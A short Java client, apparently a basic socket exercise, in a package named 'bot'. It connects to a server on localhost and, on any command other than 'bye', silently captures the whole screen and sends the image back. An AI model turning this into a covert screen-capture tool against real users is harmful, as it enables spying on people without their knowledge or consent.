package bot;

import java.io.*;
import java.net.*;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;

public class Client {
    public static void screenshot() throws AWTException, IOException {
        Robot robot = new Robot();
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        BufferedImage image = robot.createScreenCapture(
            new Rectangle(0, 0, screenSize.width, screenSize.height));
        ImageIO.write(image, "PNG", new File("screenshot.png"));
    }
    public static void main(String[] args) {
        Socket socket = null;
        BufferedReader reader = null;
        PrintWriter writer = null;
        FileInputStream fis = null;
        try {
            socket = new Socket("localhost", 45190);
            writer = new PrintWriter(socket.getOutputStream(), true);
            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            while (true) {
                String input = reader.readLine();
                if (input.equals("bye")) {
                    break;
                }
                else {
                    screenshot();
                    fis = new FileInputStream("screenshot.png");
                    int ch;
                    byte[] fileBuff = new byte[1024];
                    OutputStream output = socket.getOutputStream();
                    while ((ch = fis.read(fileBuff)) != -1) {
                        output.write(fileBuff ,0 , ch);
                    }
                    fis.close();
                }
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            try {
                socket.close();
                reader.close();
                writer.close();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
